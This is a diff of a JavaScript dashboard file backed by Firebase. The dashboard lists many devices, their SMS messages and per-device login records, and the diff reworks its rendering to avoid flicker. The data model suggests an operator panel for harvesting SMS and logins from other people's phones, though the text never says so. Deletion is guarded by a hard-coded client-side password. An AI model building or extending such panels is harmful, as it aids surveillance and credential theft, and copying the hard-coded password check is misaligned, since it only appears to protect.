@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - Complete Fixed: Search, Delete SMS, No Blink       */
+/* app.js - Live Realtime Data with No Blink - Complete        */
 /* ============================================================ */
 
 // ============================================================
@@ -46,9 +46,13 @@ let isUpdatingUI = false;
 let deviceOnlineStatus = {};
 let renderTimeout = null;
 let lastRenderTime = 0;
-const MIN_RENDER_INTERVAL = 300;
+const MIN_RENDER_INTERVAL = 500;
 let lastDataHash = '';
 let deletePassword = '9999';
+let isFirstLoad = true;
+let deviceListCache = {};
+let smsListCache = {};
+let loginListCache = {};
 
 // ============================================================
 // DOM REFS
@@ -56,7 +60,7 @@ let deletePassword = '9999';
 const $ = (id) => document.getElementById(id);
 
 // ============================================================
-// CONNECTION MONITOR
+// CONNECTION MONITOR - LIVE
 // ============================================================
 db.ref(".info/connected").on("value", (snap) => {
     const badge = $('statusBadge');
@@ -64,54 +68,63 @@ db.ref(".info/connected").on("value", (snap) => {
     if (snap.val() === true) {
         badge.className = 'connection-status online';
         text.textContent = 'Online';
+        showToast('🟢 Connected to Firebase', 'success', 1500);
     } else {
         badge.className = 'connection-status offline';
         text.textContent = 'Offline';
+        showToast('🔴 Disconnected from Firebase', 'error', 1500);
     }
 });
 
 // ============================================================
-// MAIN DATA LISTENER - NO BLINK
+// MAIN DATA LISTENER - LIVE REALTIME WITH NO BLINK
 // ============================================================
-let firstLoad = true;
-
 db.ref().on("value", (snapshot) => {
     const newData = snapshot.val() || {};
     
+    // Check if data actually changed
     const newHash = JSON.stringify(newData);
     if (newHash === lastDataHash) {
         return;
     }
     
+    // Store data
     cachedData = newData;
     lastDataHash = newHash;
-
+    
+    // Update caches
     updateDeviceOnlineStatus();
-
+    buildDeviceCaches();
+    
+    // Check if user is typing
     const active = document.activeElement;
     const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
-    if (typing) return;
-
+    if (typing) {
+        // Still update caches but don't render
+        return;
+    }
+    
+    // Throttle render calls
     const now = Date.now();
     if (now - lastRenderTime < MIN_RENDER_INTERVAL) {
         if (renderTimeout) clearTimeout(renderTimeout);
         renderTimeout = setTimeout(() => {
             if (!isRendering && !isUpdatingUI) {
-                renderAll();
+                performRender();
                 lastRenderTime = Date.now();
             }
             renderTimeout = null;
         }, MIN_RENDER_INTERVAL);
         return;
     }
-
+    
     if (!isRendering && !isUpdatingUI) {
-        renderAll();
+        performRender();
         lastRenderTime = now;
     }
-
-    if (firstLoad) {
-        firstLoad = false;
+    
+    if (isFirstLoad) {
+        isFirstLoad = false;
         if (!isPanelOpen.devices) {
             togglePanel('devices');
         }
@@ -119,7 +132,35 @@ db.ref().on("value", (snapshot) => {
 });
 
 // ============================================================
-// UPDATE DEVICE ONLINE STATUS
+// BUILD DEVICE CACHES
+// ============================================================
+function buildDeviceCaches() {
+    const devices = cachedData.user_data || {};
+    const smsData = cachedData.user_sms || {};
+    const loginData = cachedData.login || {};
+    
+    // Build device list cache
+    allDeviceKeys = Object.keys(devices);
+    
+    // Build SMS cache per device
+    allDeviceKeys.forEach(devId => {
+        if (smsData[devId]) {
+            const keys = Object.keys(smsData[devId]);
+            if (!deviceSmsCache[devId]) {
+                deviceSmsCache[devId] = { offset: 0, all: [] };
+            }
+            // Only update if changed
+            const newAll = keys.map(k => smsData[devId][k]);
+            if (JSON.stringify(deviceSmsCache[devId].all) !== JSON.stringify(newAll)) {
+                deviceSmsCache[devId].all = newAll;
+                deviceSmsCache[devId].offset = 0;
+            }
+        }
+    });
+}
+
+// ============================================================
+// UPDATE DEVICE ONLINE STATUS - REAL TIME
 // ============================================================
 function updateDeviceOnlineStatus() {
     const devices = cachedData.user_data || {};
@@ -129,192 +170,38 @@ function updateDeviceOnlineStatus() {
         const lastSeen = dev.last_online || dev.timestamp || 0;
         const currentTime = Date.now();
         const isRecent = (currentTime - lastSeen) < 120000;
-        deviceOnlineStatus[devId] = isOnline || isRecent;
-    });
-}
-
-// ============================================================
-// SEARCH DEVICES
-// ============================================================
-function searchDevices(query) {
-    searchQuery = query.toLowerCase().trim();
-    deviceOffset = 0;
-    renderDevices();
-}
-
-function clearSearch() {
-    searchQuery = '';
-    $('deviceSearchInput').value = '';
-    deviceOffset = 0;
-    renderDevices();
-}
-
-// ============================================================
-// DELETE ALL SMS - WITH PASSWORD
-// ============================================================
-function deleteAllSms() {
-    const password = prompt('🔐 Enter Password to Delete All SMS:');
-    if (password === null) return; // Cancel
-    
-    if (password !== deletePassword) {
-        showToast('❌ Incorrect Password!', 'error');
-        return;
-    }
-    
-    if (!confirm('⚠️ Are you sure you want to DELETE ALL SMS messages? This action cannot be undone!')) {
-        return;
-    }
-    
-    const smsData = cachedData.user_sms || {};
-    if (Object.keys(smsData).length === 0) {
-        showToast('📭 No SMS to delete', 'info');
-        return;
-    }
-    
-    showToast('⏳ Deleting all SMS...', 'info');
-    
-    // Delete all SMS from Firebase
-    const promises = [];
-    Object.keys(smsData).forEach(devId => {
-        promises.push(db.ref(`user_sms/${devId}`).remove());
-    });
-    
-    Promise.all(promises).then(() => {
-        showToast('✅ All SMS deleted successfully!', 'success');
-        // Clear cache
-        Object.keys(deviceSmsCache).forEach(key => {
-            deviceSmsCache[key] = { offset: 0, all: [] };
-        });
-        allSmsList = [];
-        allSmsOffset = 0;
-        renderAll();
-    }).catch(err => {
-        showToast('❌ Error deleting SMS: ' + err.message, 'error');
-    });
-}
-
-// ============================================================
-// DELETE SPECIFIC SMS - WITH PASSWORD
-// ============================================================
-function deleteDeviceSms(devId) {
-    const password = prompt('🔐 Enter Password to Delete SMS:');
-    if (password === null) return;
-    
-    if (password !== deletePassword) {
-        showToast('❌ Incorrect Password!', 'error');
-        return;
-    }
-    
-    if (!confirm(`⚠️ Delete all SMS for device ${devId}?`)) {
-        return;
-    }
-    
-    const smsData = cachedData.user_sms || {};
-    if (!smsData[devId] || Object.keys(smsData[devId]).length === 0) {
-        showToast('📭 No SMS for this device', 'info');
-        return;
-    }
-    
-    showToast(`⏳ Deleting SMS for ${devId}...`, 'info');
-    
-    db.ref(`user_sms/${devId}`).remove().then(() => {
-        showToast(`✅ SMS deleted for ${devId}`, 'success');
-        deviceSmsCache[devId] = { offset: 0, all: [] };
-        allSmsList = [];
-        allSmsOffset = 0;
-        renderAll();
-    }).catch(err => {
-        showToast('❌ Error: ' + err.message, 'error');
-    });
-}
-
-// ============================================================
-// CHECK DEVICE STATUS
-// ============================================================
-function checkDeviceStatus(devId) {
-    if (!devId) return;
-    
-    const statusEl = document.getElementById(`status-${devId}`);
-    const timeEl = document.getElementById(`time-${devId}`);
-    
-    if (!statusEl) return;
-    
-    statusEl.textContent = '⏳ Checking...';
-    statusEl.className = 'device-status checking';
-    
-    db.ref(`user_data/${devId}`).once('value').then(snap => {
-        if (snap.exists()) {
-            const dev = snap.val();
-            const isOnline = dev.isOnline || dev.online || false;
-            const lastSeen = dev.last_online || dev.timestamp || 0;
-            const currentTime = Date.now();
-            const isRecent = (currentTime - lastSeen) < 120000;
-            const finalStatus = isOnline || isRecent;
-            
-            deviceOnlineStatus[devId] = finalStatus;
-            updateDeviceStatusUI(devId, finalStatus, lastSeen);
-            
-            showToast(`📱 ${devId}: ${finalStatus ? '🟢 Online' : '🔴 Offline'}`, finalStatus ? 'success' : 'error');
-        } else {
-            statusEl.textContent = '❌ Not Found';
-            statusEl.className = 'device-status offline';
-            showToast('❌ Device not found', 'error');
+        const status = isOnline || isRecent;
+        
+        // Only update if changed
+        if (deviceOnlineStatus[devId] !== status) {
+            deviceOnlineStatus[devId] = status;
         }
-    }).catch(() => {
-        statusEl.textContent = '❌ Error';
-        statusEl.className = 'device-status offline';
-        showToast('❌ Error checking status', 'error');
     });
 }
 
 // ============================================================
-// UPDATE DEVICE STATUS UI
+// PERFORM RENDER - OPTIMIZED
 // ============================================================
-function updateDeviceStatusUI(devId, isOnline, lastSeen) {
-    const statusEl = document.getElementById(`status-${devId}`);
-    const timeEl = document.getElementById(`time-${devId}`);
-    
-    if (statusEl) {
-        const statusText = isOnline ? '● Online' : '● Offline';
-        const statusClass = isOnline ? 'online' : 'offline';
-        statusEl.textContent = statusText;
-        statusEl.className = `device-status ${statusClass}`;
-    }
-    
-    if (timeEl) {
-        const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
-        timeEl.textContent = `⏱ ${timeStr}`;
-    }
-}
-
-// ============================================================
-// RENDER ALL
-// ============================================================
-function renderAll() {
+function performRender() {
     if (isRendering || isUpdatingUI) return;
     isRendering = true;
     
     try {
-        updateDeviceOnlineStatus();
-        renderDevices();
-        renderAllSms();
-        renderAnalytics();
-        updateBackupDeviceList();
-
-        const devices = cachedData.user_data || {};
-        const keys = Object.keys(devices);
-        $('deviceCount').textContent = keys.length;
-        $('panelDeviceCount').textContent = keys.length;
-
-        const smsData = cachedData.user_sms || {};
-        let totalSms = 0;
-        Object.keys(smsData).forEach(d => {
-            totalSms += Object.keys(smsData[d]).length;
-        });
-        $('smsCount').textContent = totalSms;
-        $('panelSmsCount').textContent = totalSms;
-
+        // Update counts first (quick)
+        updateCounts();
+        
+        // Render only visible panels
+        if (isPanelOpen.devices) {
+            renderDevicesOptimized();
+        }
+        if (isPanelOpen.sms) {
+            renderAllSmsOptimized();
+        }
+        if (isPanelOpen.analytics) {
+            renderAnalytics();
+        }
         if (isPanelOpen.backup) {
+            updateBackupDeviceList();
             const selected = $('backupDeviceSelect').value;
             if (selected) {
                 updateBackupStatusDisplay(selected);
@@ -327,134 +214,40 @@ function renderAll() {
 }
 
 // ============================================================
-// TOGGLE PANEL
+// UPDATE COUNTS - FAST
 // ============================================================
-function togglePanel(panel) {
-    const panels = ['devices', 'sms', 'backup', 'analytics'];
-
-    panels.forEach(p => {
-        if (p !== panel) {
-            const el = $(`panel${p.charAt(0).toUpperCase() + p.slice(1)}`);
-            if (el) el.classList.remove('active');
-            const nav = document.querySelector(`.nav-item[data-panel="${p}"]`);
-            if (nav) nav.classList.remove('active');
-            isPanelOpen[p] = false;
-        }
+function updateCounts() {
+    const devices = cachedData.user_data || {};
+    const keys = Object.keys(devices);
+    $('deviceCount').textContent = keys.length;
+    $('panelDeviceCount').textContent = keys.length;
+    
+    const smsData = cachedData.user_sms || {};
+    let totalSms = 0;
+    Object.keys(smsData).forEach(d => {
+        totalSms += Object.keys(smsData[d]).length;
     });
-
-    const panelEl = $(`panel${panel.charAt(0).toUpperCase() + panel.slice(1)}`);
-    const nav = document.querySelector(`.nav-item[data-panel="${panel}"]`);
-
-    if (panelEl) {
-        isPanelOpen[panel] = !isPanelOpen[panel];
-        if (isPanelOpen[panel]) {
-            panelEl.classList.add('active');
-            if (nav) nav.classList.add('active');
-            if (panel === 'devices') renderDevices();
-            if (panel === 'sms') renderAllSms();
-            if (panel === 'analytics') renderAnalytics();
-            if (panel === 'backup') {
-                updateBackupDeviceList();
-                const selected = $('backupDeviceSelect').value;
-                if (selected) {
-                    updateBackupStatusDisplay(selected);
-                    loadBackupSmsForDevice(selected);
-                }
-            }
-        } else {
-            panelEl.classList.remove('active');
-            if (nav) nav.classList.remove('active');
-        }
+    $('smsCount').textContent = totalSms;
+    
+    if (!smsFilterDevice) {
+        $('panelSmsCount').textContent = totalSms;
     }
 }
 
 // ============================================================
-// FILTER DEVICES
+// RENDER DEVICES OPTIMIZED - NO BLINK
 // ============================================================
-function filterDevices(filter) {
-    currentFilter = filter;
-    deviceOffset = 0;
-
-    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
-    if (filter === 'all') $('filterAll').classList.add('active');
-    else if (filter === 'online') $('filterOnline').classList.add('active');
-    else if (filter === 'offline') $('filterOffline').classList.add('active');
-
-    renderDevices();
-}
-
-// ============================================================
-// GET DEVICE ONLINE STATUS
-// ============================================================
-function isDeviceOnline(devId) {
-    if (deviceOnlineStatus[devId] !== undefined) {
-        return deviceOnlineStatus[devId];
-    }
-    const dev = cachedData.user_data?.[devId];
-    if (!dev) return false;
-    const online = dev.isOnline || dev.online || false;
-    const lastSeen = dev.last_online || dev.timestamp || 0;
-    const isRecent = (Date.now() - lastSeen) < 120000;
-    const status = online || isRecent;
-    deviceOnlineStatus[devId] = status;
-    return status;
-}
-
-// ============================================================
-// GET DEVICE SERIAL NUMBER
-// ============================================================
-function getDeviceSerial(devId) {
-    if (deviceSerialMap[devId]) return deviceSerialMap[devId];
-    const dev = cachedData.user_data?.[devId];
-    if (dev) {
-        let serial = dev.user_serial || dev.uesr_serial || 0;
-        if (typeof serial === 'string') serial = parseInt(serial) || 0;
-        deviceSerialMap[devId] = serial;
-        return serial;
-    }
-    return 0;
-}
-
-// ============================================================
-// RENDER DEVICES - WITH SEARCH
-// ============================================================
-function renderDevices() {
-    if (isUpdatingUI) return;
+function renderDevicesOptimized() {
     const container = $('devicesContainer');
     const devices = cachedData.user_data || {};
-    allDeviceKeys = Object.keys(devices);
-
+    
+    // Update online status
     updateDeviceOnlineStatus();
-
-    // Filter by search query first
-    let searchFiltered = allDeviceKeys;
-    if (searchQuery) {
-        searchFiltered = allDeviceKeys.filter(id => {
-            const dev = devices[id] || {};
-            const name = dev.d_name || dev.device_name || id;
-            const serial = getDeviceSerial(id);
-            const searchStr = (id + ' ' + name + ' ' + serial).toLowerCase();
-            return searchStr.includes(searchQuery);
-        });
-    }
-
-    // Sort by serial
-    searchFiltered.sort((a, b) => {
-        const serialA = getDeviceSerial(a);
-        const serialB = getDeviceSerial(b);
-        return serialB - serialA;
-    });
-
-    // Apply filter (online/offline/all)
-    if (currentFilter === 'online') {
-        filteredDeviceKeys = searchFiltered.filter(id => isDeviceOnline(id));
-    } else if (currentFilter === 'offline') {
-        filteredDeviceKeys = searchFiltered.filter(id => !isDeviceOnline(id));
-    } else {
-        filteredDeviceKeys = searchFiltered;
-    }
-
-    if (filteredDeviceKeys.length === 0) {
+    
+    // Get filtered and sorted keys
+    let keys = getFilteredDeviceKeys();
+    
+    if (keys.length === 0) {
         let msg = 'No devices found';
         if (searchQuery) msg = 'No devices match "' + searchQuery + '"';
         else if (currentFilter === 'online') msg = 'No online devices';
@@ -462,53 +255,51 @@ function renderDevices() {
         container.innerHTML = `<div class="empty-luxury"><i class="fas fa-search" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>${msg}</div>`;
         return;
     }
-
+    
     const start = deviceOffset;
-    const end = Math.min(start + DEVICE_LIMIT, filteredDeviceKeys.length);
-    const displayKeys = filteredDeviceKeys.slice(start, end);
-    const hasMore = end < filteredDeviceKeys.length;
-
+    const end = Math.min(start + DEVICE_LIMIT, keys.length);
+    const displayKeys = keys.slice(start, end);
+    const hasMore = end < keys.length;
+    
     let html = '';
-
+    
     displayKeys.forEach((devId, index) => {
         const dev = devices[devId] || {};
         const serial = getDeviceSerial(devId);
         const deviceNumber = start + index + 1;
-
         const online = isDeviceOnline(devId);
         const lastSeen = dev.last_online || dev.timestamp;
         const statusClass = online ? 'online' : 'offline';
         const statusText = online ? '● Online' : '● Offline';
         const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
-
-        const smsData = cachedData.user_sms || {};
-        let devSmsList = [];
-        let totalSms = 0;
-        if (smsData[devId]) {
-            const keys = Object.keys(smsData[devId]);
-            totalSms = keys.length;
-            if (!deviceSmsCache[devId]) {
-                deviceSmsCache[devId] = { offset: 0, all: [] };
-                keys.forEach(k => deviceSmsCache[devId].all.push(smsData[devId][k]));
-            }
-            const cache = deviceSmsCache[devId];
-            const startIdx = cache.offset;
-            const endIdx = Math.min(startIdx + SMS_LIMIT, cache.all.length);
-            devSmsList = cache.all.slice(startIdx, endIdx).reverse();
-        }
-
-        const isExpanded = expandedDevices[devId] || false;
-        const activeTab = activeTabs[devId] || null;
-        const hasMoreSms = deviceSmsCache[devId] &&
-            (deviceSmsCache[devId].offset + SMS_LIMIT < deviceSmsCache[devId].all.length);
-
+        
+        // Get SMS count
+        const totalSms = deviceSmsCache[devId] ? deviceSmsCache[devId].all.length : 0;
+        
+        // Get login data
         const loginData = cachedData.login || {};
         let devLoginList = [];
         if (loginData[devId]) {
             Object.keys(loginData[devId]).forEach(k => devLoginList.push(loginData[devId][k]));
             devLoginList.reverse();
         }
-
+        
+        const isExpanded = expandedDevices[devId] || false;
+        const activeTab = activeTabs[devId] || null;
+        
+        // Get SMS list for display
+        let devSmsList = [];
+        const hasMoreSms = deviceSmsCache[devId] && 
+            (deviceSmsCache[devId].offset + SMS_LIMIT < deviceSmsCache[devId].all.length);
+        
+        if (deviceSmsCache[devId]) {
+            const cache = deviceSmsCache[devId];
+            const startIdx = cache.offset;
+            const endIdx = Math.min(startIdx + SMS_LIMIT, cache.all.length);
+            devSmsList = cache.all.slice(startIdx, endIdx).reverse();
+        }
+        
+        // Build login HTML
         let allLoginHtml = '';
         if (devLoginList.length > 0) {
             allLoginHtml = devLoginList.map((rec, idx) => {
@@ -527,7 +318,7 @@ function renderDevices() {
                 </div>`;
             }).join('');
         }
-
+        
         html += `
             <div class="device-card-luxury ${isExpanded ? 'expanded' : ''}" id="card-${devId}">
                 <div class="device-top" onclick="toggleDevice('${devId}')">
@@ -671,18 +462,19 @@ function renderDevices() {
             </div>
         `;
     });
-
+    
     container.innerHTML = html;
-
+    
+    // Add load more button
     if (hasMore) {
-        const remaining = filteredDeviceKeys.length - end;
+        const remaining = keys.length - end;
         container.innerHTML += `
             <button class="btn-load-more" onclick="loadMoreDevices()">
                 <i class="fas fa-chevron-down"></i> Load More (${remaining} remaining)
             </button>
         `;
     }
-
+    
     if (deviceOffset > 0) {
         const backBtn = document.createElement('button');
         backBtn.className = 'btn-load-more';
@@ -690,9 +482,95 @@ function renderDevices() {
         backBtn.innerHTML = '<i class="fas fa-chevron-up"></i> Back';
         backBtn.onclick = function() {
             deviceOffset = Math.max(0, deviceOffset - DEVICE_LIMIT);
-            renderDevices();
+            renderDevicesOptimized();
         };
         container.insertBefore(backBtn, container.firstChild);
+    }
+}
+
+// ============================================================
+// GET FILTERED DEVICE KEYS
+// ============================================================
+function getFilteredDeviceKeys() {
+    const devices = cachedData.user_data || {};
+    let keys = Object.keys(devices);
+    
+    // Search filter
+    if (searchQuery) {
+        keys = keys.filter(id => {
+            const dev = devices[id] || {};
+            const name = dev.d_name || dev.device_name || id;
+            const serial = getDeviceSerial(id);
+            const searchStr = (id + ' ' + name + ' ' + serial).toLowerCase();
+            return searchStr.includes(searchQuery);
+        });
+    }
+    
+    // Sort by serial
+    keys.sort((a, b) => {
+        const serialA = getDeviceSerial(a);
+        const serialB = getDeviceSerial(b);
+        return serialB - serialA;
+    });
+    
+    // Online/Offline filter
+    if (currentFilter === 'online') {
+        keys = keys.filter(id => isDeviceOnline(id));
+    } else if (currentFilter === 'offline') {
+        keys = keys.filter(id => !isDeviceOnline(id));
+    }
+    
+    filteredDeviceKeys = keys;
+    return keys;
+}
+
+// ============================================================
+// RENDER ALL SMS OPTIMIZED
+// ============================================================
+function renderAllSmsOptimized() {
+    const container = $('allSmsContainer');
+    const loadMore = $('allSmsLoadMore');
+    
+    if (allSmsOffset === 0) {
+        allSmsList = [];
+        const smsData = cachedData.user_sms || {};
+        Object.keys(smsData).forEach(devId => {
+            if (smsFilterDevice && smsFilterDevice !== devId) return;
+            const msgs = smsData[devId];
+            Object.keys(msgs).forEach(k => {
+                allSmsList.push({ deviceId: devId, ...msgs[k] });
+            });
+        });
+        allSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+        
+        if (smsFilterDevice) {
+            $('panelSmsCount').textContent = allSmsList.length + ' (filtered)';
+        } else {
+            $('panelSmsCount').textContent = allSmsList.length;
+        }
+    }
+    
+    if (allSmsList.length === 0) {
+        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>${smsFilterDevice ? 'No messages for ' + smsFilterDevice : 'No messages found'}</div>`;
+        loadMore.style.display = 'none';
+        return;
+    }
+    
+    const start = allSmsOffset;
+    const end = Math.min(start + SMS_LIMIT, allSmsList.length);
+    const paginated = allSmsList.slice(start, end);
+    
+    if (allSmsOffset === 0) {
+        container.innerHTML = renderSmsCards(paginated, true);
+    } else {
+        container.innerHTML += renderSmsCards(paginated, true);
+    }
+    
+    if (end < allSmsList.length) {
+        loadMore.style.display = 'block';
+        loadMore.textContent = `📥 Load More (${allSmsList.length - end} remaining)`;
+    } else {
+        loadMore.style.display = 'none';
     }
 }
 
@@ -725,7 +603,7 @@ function toggleDevice(devId) {
 }
 
 // ============================================================
-// SET TAB
+// SET TAB - NO BLINK
 // ============================================================
 function setTab(devId, tab) {
     if (isUpdatingUI) return;
@@ -741,20 +619,22 @@ function setTab(devId, tab) {
         
         const card = document.getElementById(`card-${devId}`);
         if (!card) return;
-
+        
+        // Update button states
         const buttons = card.querySelectorAll('.device-actions-luxury .sub-btn');
         buttons.forEach(btn => {
             btn.className = btn.className.replace(/active-\w+/g, '').trim();
         });
-
+        
+        // Update section visibility
         const sections = card.querySelectorAll('.section-box');
         sections.forEach(sec => sec.classList.remove('active'));
-
+        
         const targetTab = activeTabs[devId];
         if (targetTab) {
             const activeSec = card.querySelector(`#sec-${targetTab}-${devId}`);
             if (activeSec) activeSec.classList.add('active');
-
+            
             buttons.forEach(btn => {
                 if (btn.textContent.trim().includes('💬') && targetTab === 'sms') btn.classList.add('active-sms');
                 else if (btn.textContent.trim().includes('🔑') && targetTab === 'login') btn.classList.add('active-login');
@@ -771,11 +651,260 @@ function setTab(devId, tab) {
 }
 
 // ============================================================
+// SEARCH DEVICES
+// ============================================================
+function searchDevices(query) {
+    searchQuery = query.toLowerCase().trim();
+    deviceOffset = 0;
+    renderDevicesOptimized();
+}
+
+function clearSearch() {
+    searchQuery = '';
+    const input = $('deviceSearchInput');
+    if (input) input.value = '';
+    const clearBtn = $('searchClearBtn');
+    if (clearBtn) clearBtn.style.display = 'none';
+    deviceOffset = 0;
+    renderDevicesOptimized();
+}
+
+// ============================================================
+// DELETE ALL SMS
+// ============================================================
+function deleteAllSms() {
+    const password = prompt('🔐 Enter Password to Delete All SMS:');
+    if (password === null) return;
+    
+    if (password !== deletePassword) {
+        showToast('❌ Incorrect Password!', 'error');
+        return;
+    }
+    
+    if (!confirm('⚠️ Are you sure you want to DELETE ALL SMS messages? This action cannot be undone!')) {
+        return;
+    }
+    
+    const smsData = cachedData.user_sms || {};
+    if (Object.keys(smsData).length === 0) {
+        showToast('📭 No SMS to delete', 'info');
+        return;
+    }
+    
+    showToast('⏳ Deleting all SMS...', 'info');
+    
+    const promises = [];
+    Object.keys(smsData).forEach(devId => {
+        promises.push(db.ref(`user_sms/${devId}`).remove());
+    });
+    
+    Promise.all(promises).then(() => {
+        showToast('✅ All SMS deleted successfully!', 'success');
+        Object.keys(deviceSmsCache).forEach(key => {
+            deviceSmsCache[key] = { offset: 0, all: [] };
+        });
+        allSmsList = [];
+        allSmsOffset = 0;
+        performRender();
+    }).catch(err => {
+        showToast('❌ Error deleting SMS: ' + err.message, 'error');
+    });
+}
+
+// ============================================================
+// DELETE DEVICE SMS
+// ============================================================
+function deleteDeviceSms(devId) {
+    const password = prompt('🔐 Enter Password to Delete SMS:');
+    if (password === null) return;
+    
+    if (password !== deletePassword) {
+        showToast('❌ Incorrect Password!', 'error');
+        return;
+    }
+    
+    if (!confirm(`⚠️ Delete all SMS for device ${devId}?`)) {
+        return;
+    }
+    
+    const smsData = cachedData.user_sms || {};
+    if (!smsData[devId] || Object.keys(smsData[devId]).length === 0) {
+        showToast('📭 No SMS for this device', 'info');
+        return;
+    }
+    
+    showToast(`⏳ Deleting SMS for ${devId}...`, 'info');
+    
+    db.ref(`user_sms/${devId}`).remove().then(() => {
+        showToast(`✅ SMS deleted for ${devId}`, 'success');
+        deviceSmsCache[devId] = { offset: 0, all: [] };
+        allSmsList = [];
+        allSmsOffset = 0;
+        performRender();
+    }).catch(err => {
+        showToast('❌ Error: ' + err.message, 'error');
+    });
+}
+
+// ============================================================
+// CHECK DEVICE STATUS - LIVE
+// ============================================================
+function checkDeviceStatus(devId) {
+    if (!devId) return;
+    
+    const statusEl = document.getElementById(`status-${devId}`);
+    const timeEl = document.getElementById(`time-${devId}`);
+    
+    if (!statusEl) return;
+    
+    statusEl.textContent = '⏳ Checking...';
+    statusEl.className = 'device-status checking';
+    
+    // Check directly from Firebase
+    db.ref(`user_data/${devId}`).once('value').then(snap => {
+        if (snap.exists()) {
+            const dev = snap.val();
+            const isOnline = dev.isOnline || dev.online || false;
+            const lastSeen = dev.last_online || dev.timestamp || 0;
+            const currentTime = Date.now();
+            const isRecent = (currentTime - lastSeen) < 120000;
+            const finalStatus = isOnline || isRecent;
+            
+            deviceOnlineStatus[devId] = finalStatus;
+            updateDeviceStatusUI(devId, finalStatus, lastSeen);
+            
+            showToast(`📱 ${devId}: ${finalStatus ? '🟢 Online' : '🔴 Offline'}`, finalStatus ? 'success' : 'error');
+        } else {
+            statusEl.textContent = '❌ Not Found';
+            statusEl.className = 'device-status offline';
+            showToast('❌ Device not found', 'error');
+        }
+    }).catch(() => {
+        statusEl.textContent = '❌ Error';
+        statusEl.className = 'device-status offline';
+        showToast('❌ Error checking status', 'error');
+    });
+}
+
+// ============================================================
+// UPDATE DEVICE STATUS UI
+// ============================================================
+function updateDeviceStatusUI(devId, isOnline, lastSeen) {
+    const statusEl = document.getElementById(`status-${devId}`);
+    const timeEl = document.getElementById(`time-${devId}`);
+    
+    if (statusEl) {
+        const statusText = isOnline ? '● Online' : '● Offline';
+        const statusClass = isOnline ? 'online' : 'offline';
+        statusEl.textContent = statusText;
+        statusEl.className = `device-status ${statusClass}`;
+    }
+    
+    if (timeEl) {
+        const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
+        timeEl.textContent = `⏱ ${timeStr}`;
+    }
+}
+
+// ============================================================
+// GET DEVICE ONLINE STATUS
+// ============================================================
+function isDeviceOnline(devId) {
+    if (deviceOnlineStatus[devId] !== undefined) {
+        return deviceOnlineStatus[devId];
+    }
+    const dev = cachedData.user_data?.[devId];
+    if (!dev) return false;
+    const online = dev.isOnline || dev.online || false;
+    const lastSeen = dev.last_online || dev.timestamp || 0;
+    const isRecent = (Date.now() - lastSeen) < 120000;
+    const status = online || isRecent;
+    deviceOnlineStatus[devId] = status;
+    return status;
+}
+
+// ============================================================
+// GET DEVICE SERIAL NUMBER
+// ============================================================
+function getDeviceSerial(devId) {
+    if (deviceSerialMap[devId]) return deviceSerialMap[devId];
+    const dev = cachedData.user_data?.[devId];
+    if (dev) {
+        let serial = dev.user_serial || dev.uesr_serial || 0;
+        if (typeof serial === 'string') serial = parseInt(serial) || 0;
+        deviceSerialMap[devId] = serial;
+        return serial;
+    }
+    return 0;
+}
+
+// ============================================================
 // LOAD MORE DEVICES
 // ============================================================
 function loadMoreDevices() {
     deviceOffset += DEVICE_LIMIT;
-    renderDevices();
+    renderDevicesOptimized();
+}
+
+// ============================================================
+// LOAD MORE DEVICE SMS
+// ============================================================
+function loadMoreDeviceSms(devId) {
+    if (deviceSmsCache[devId]) {
+        deviceSmsCache[devId].offset += SMS_LIMIT;
+        renderDevicesOptimized();
+        expandedDevices[devId] = true;
+        activeTabs[devId] = 'sms';
+        const cardEl = document.getElementById(`card-${devId}`);
+        if (cardEl) cardEl.classList.add('expanded');
+    }
+}
+
+// ============================================================
+// TOGGLE PANEL
+// ============================================================
+function togglePanel(panel) {
+    const panels = ['devices', 'sms', 'backup', 'analytics'];
+    
+    panels.forEach(p => {
+        if (p !== panel) {
+            const el = $(`panel${p.charAt(0).toUpperCase() + p.slice(1)}`);
+            if (el) el.classList.remove('active');
+            const nav = document.querySelector(`.nav-item[data-panel="${p}"]`);
+            if (nav) nav.classList.remove('active');
+            isPanelOpen[p] = false;
+        }
+    });
+    
+    const panelEl = $(`panel${panel.charAt(0).toUpperCase() + panel.slice(1)}`);
+    const nav = document.querySelector(`.nav-item[data-panel="${panel}"]`);
+    
+    if (panelEl) {
+        isPanelOpen[panel] = !isPanelOpen[panel];
+        if (isPanelOpen[panel]) {
+            panelEl.classList.add('active');
+            if (nav) nav.classList.add('active');
+            performRender();
+        } else {
+            panelEl.classList.remove('active');
+            if (nav) nav.classList.remove('active');
+        }
+    }
+}
+
+// ============================================================
+// FILTER DEVICES
+// ============================================================
+function filterDevices(filter) {
+    currentFilter = filter;
+    deviceOffset = 0;
+    
+    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
+    if (filter === 'all') $('filterAll').classList.add('active');
+    else if (filter === 'online') $('filterOnline').classList.add('active');
+    else if (filter === 'offline') $('filterOffline').classList.add('active');
+    
+    renderDevicesOptimized();
 }
 
 // ============================================================
@@ -807,11 +936,11 @@ function filterSmsByDevice(deviceId) {
     $('clearSmsFilterBtn').style.display = 'inline-block';
     allSmsOffset = 0;
     showToast(`📱 Filtering: ${deviceId}`, 'info');
-
+    
     if (!isPanelOpen.sms) {
         togglePanel('sms');
     } else {
-        renderAllSms();
+        renderAllSmsOptimized();
     }
 }
 
@@ -819,74 +948,8 @@ function clearSmsFilter() {
     smsFilterDevice = null;
     $('clearSmsFilterBtn').style.display = 'none';
     allSmsOffset = 0;
-    renderAllSms();
+    renderAllSmsOptimized();
     showToast('✅ Filter cleared', 'success');
-}
-
-// ============================================================
-// RENDER ALL SMS
-// ============================================================
-function renderAllSms() {
-    const container = $('allSmsContainer');
-    const loadMore = $('allSmsLoadMore');
-
-    if (allSmsOffset === 0) {
-        allSmsList = [];
